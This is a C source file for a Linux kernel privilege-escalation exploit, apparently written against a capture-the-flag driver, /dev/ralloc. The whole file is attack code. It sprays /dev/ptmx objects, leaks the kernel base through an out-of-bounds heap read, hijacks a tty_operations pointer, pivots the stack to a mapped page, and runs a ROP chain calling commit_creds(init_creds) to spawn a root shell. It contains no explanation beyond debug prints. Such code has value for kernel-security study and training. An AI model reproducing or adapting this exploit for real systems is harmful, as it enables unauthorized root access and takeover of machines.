#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include<linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <pthread.h>
#include <poll.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0x10af6a0;
unsigned long pop_rdi, kpti;
unsigned long init_creds = 0x165fa00;
unsigned long commit_creds = 0xc0540;

void *fake_tty_operations[30];

int spray_fd[0x100];

struct message {
  unsigned int index;
  long size;
  char *buf;
};


void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
   if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void get_shell()
{
    printf("is system?\n");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}



int main() {
  unsigned long buf[0x420 / sizeof(unsigned long)];
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDONLY);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  for(int i=0; i<0x100; i++)
 {
   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 }

  /* leak kbase & kheap */
  //int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  kmalloc(fd, 0, 0x400);
  get(fd, 0, 0x420, &buf);
  kbase = buf[131] - ptm_unix98_ops;
  buf[19] = 0xdeadbeef;

  printf("[*] Leak                :   %p\n", buf[131]);

  if (buf[131] & 0xfff != 0x6a0)
  {
    printf("[!] Error, exploit failed.\n");
    exit(-1);
  }
  printf("[*] Base                :   %p\n", kbase);
  printf("[*] Gadget              :   %p\n", kbase + 0xb55c7);
  commit_creds = kbase + commit_creds;
  init_creds = kbase + init_creds;
  pop_rdi = kbase + 0x8b8a0;      // pop rdi; ret
  kpti = kbase + 0xc00a34;       // swapgs_restore_regs_and_return_to_usermode
  printf("[*] init_creds:   %p\n", init_creds);
  printf("[*] commit_creds        :   %p\n", commit_creds);
  printf("[*] get_shell            :   %p\n", &get_shell);
  printf("[!] DEBUG....:");
  getchar();
  fake_tty_operations[12] = kbase + 0x4cba4;
  buf[131] = &fake_tty_operations;
  //buf[4] = 0xdeadbeef;
  buf[4] = kbase + 0x4cba4; //  mov esp, 0xf6000000 ; ret
  buf[5] = 0xdeadbeef;
  // rop chain

  unsigned long iretq = kbase + 0xffffffff810379fb - 0xffffffff81000000;
  unsigned long swapgs = kbase + 0xffffffff81074b54 - 0xffffffff81000000;
  unsigned long pivot_target = kbase + 0x4cba4 & 0xffffffff;
  unsigned long *fake_stack = &pivot_target;
  void *mapped = mmap(pivot_target & 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0);
  printf("mmap'd chunk:       %p\n", mapped);
  printf("pivot_target:       %p\n", pivot_target);

  unsigned long prepare_kernel_creds = kbase + 0xc07a0;
  unsigned long do_execve = kbase + 0x2bd860;
  unsigned long pop_rsi = kbase + 0x1440be; // pop rsi; ret;
  unsigned long pop_rdx = kbase + 0x3bbc2;
  unsigned long getname = kbase + 0x2c6250;
  unsigned long xchg_rdi_rax = kbase + 0xc02394; // xchg rdi, rax
  char *shell = "/bin/sh";
  unsigned long long user_rflags, user_cs, user_ss, user_sp;
	asm volatile(
		"mov %0, %%cs\n"
		"mov %1, %%ss\n"
		"mov %2, %%rsp\n"
		"pushfq\n"
		"pop %3\n"
		: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
	);

    unsigned long long rop[] = {
         pop_rdi, // pop rdi
         init_creds,
         commit_creds,
         swapgs,
         0xdeadbeef,
         iretq,
         get_shell,
         user_cs,
         user_rflags,
         user_sp,
        user_ss,
    };
 memcpy((void *)(kbase + 0x4cba4 & 0xffffffff), rop, sizeof(rop));
 puts("[*] Finished writing rop chain to mmap'd page");

  fill(fd, 0, 0x420, &buf);
  for(int i=0; i<0x100; i++)
  {
  	ioctl(spray_fd[i], 0, 0);
  }
  return 0;
}
